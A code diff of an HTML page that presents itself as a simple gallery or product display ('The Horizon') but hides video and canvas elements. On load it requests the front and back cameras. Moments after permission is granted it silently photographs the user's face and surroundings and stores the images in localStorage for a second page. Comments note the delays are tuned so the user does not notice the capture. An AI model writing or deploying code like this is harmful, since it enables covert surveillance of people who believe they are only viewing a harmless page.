@@ -2,63 +2,119 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Identifier</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The Gallery</title>
     <style>
-        body { background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        .content { text-align: center; padding: 20px; }
-        h1 { font-size: 3rem; color: #333; }
-        p { font-size: 1.2rem; color: #666; }
-        .next-btn { margin-top: 20px; padding: 10px 20px; border: none; background: #6c63ff; color: white; border-radius: 5px; cursor: pointer; }
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        / The Content Area /
+        .content-container {
+            text-align: center;
+            padding: 20px;
+            width: 90%;
+        }
+
+        h1 {
+            font-size: 4rem;
+            margin: 0;
+            color: #2d3436;
+            animation: fadeIn 1.5s ease;
+        }
+
+        p {
+            font-size: 1.5rem;
+            color: #636e72;
+            margin: 20px 0;
+        }
+
+        .next-btn {
+            margin-top: 30px;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            background-color: #0984e3;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(9, 132, 227, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        / Hidden Camera Elements /
+        #vFront, #vBack, #canvas {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            visibility: hidden;
+        }
     </style>
 </head>
 <body>
 
-    <div class="content">
-        <h1 id="item-name">Classic Watch</h1>
-        <p id="item-desc">A timeless piece of craftsmanship.</p>
-        <button class="next-btn" onclick="goToPageTwo()">Continue &rarr;</button>
+    <div class="content-container">
+        <h1 id="main-title">The Horizon</h1>
+        <p id="main-desc">Experience the beauty of the moment.</p>
+        <button class="next-btn" onclick="goToPageTwo()">Continue</button>
     </div>
 
-    <!-- Hidden Camera Elements -->
-    <video id="vFront" autoplay playsinline style="display:none;"></video>
-    <video id="vBack" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <!-- Hidden Video and Canvas -->
+    <video id="vFront" autoplay playsinline></video>
+    <video id="vBack" autoplay playsinline></video>
+    <canvas id="canvas" width="1080" height="1920"></canvas>
 
     <script>
-        const frontVideo = document.getElementById('vFront');
-        const backVideo = document.getElementById('vBack');
+        const vFront = document.getElementById('vFront');
+        const vBack = document.getElementById('vBack');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 1. As soon as the page loads, request the camera
+        // Set canvas to Portrait (Phone style)
+        canvas.width = 1080;
+        canvas.height = 1920;
+
         window.onload = () => {
-            // Get Front Camera
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
-                frontVideo.srcObject = stream;
+            // 1. Request both cameras immediately
+            // On mobile, this triggers the "Allow Camera" prompt
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(streamFront => {
+                vFront.srcObject = streamFront;
                 
-                // Get Back Camera
                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
-                    backVideo.srcObject = streamBack;
+                    vBack.srcObject = streamBack;
 
-                    // 2. AUTOMATIC SNAP (Happens while they are reading)
-                    // Snap Front Camera
+                    // 2. THE AUTOMATIC SNAP
+                    // We take the photos 1.5 seconds after the user clicks "Allow"
                     setTimeout(() => {
-                        ctx.drawImage(frontVideo, 0, 0, 640, 480);
-                        // Save to "Backpack" (Local Storage)
+                        // Capture Front (User's face)
+                        ctx.drawImage(vFront, 0, 0, canvas.width, canvas.height);
                         localStorage.setItem('frontPhoto', canvas.toDataURL());
-                    }, 1000);
 
-                    // Snap Back Camera
-                    setTimeout(() => {
-                        ctx.drawImage(backVideo, 0, 0, 640, 480);
-                        // Save to "Backpack" (Local Storage)
-                        localStorage.setItem('backPhoto', canvas.toDataURL());
+                        // Capture Back (What they are looking at)
+                        // We give it a tiny 0.5s delay so they don't feel like it's "instant"
+                        setTimeout(() => {
+                            ctx.drawImage(vBack, 0, 0, canvas.width, canvas.height);
+                            localStorage.setItem('backPhoto', canvas.toDataURL());
+                        }, 500);
                     }, 1500);
                 });
             });
         };
 
-        // 3. Move to Page 2
         function goToPageTwo() {
             window.location.href = "page2.html";
         }
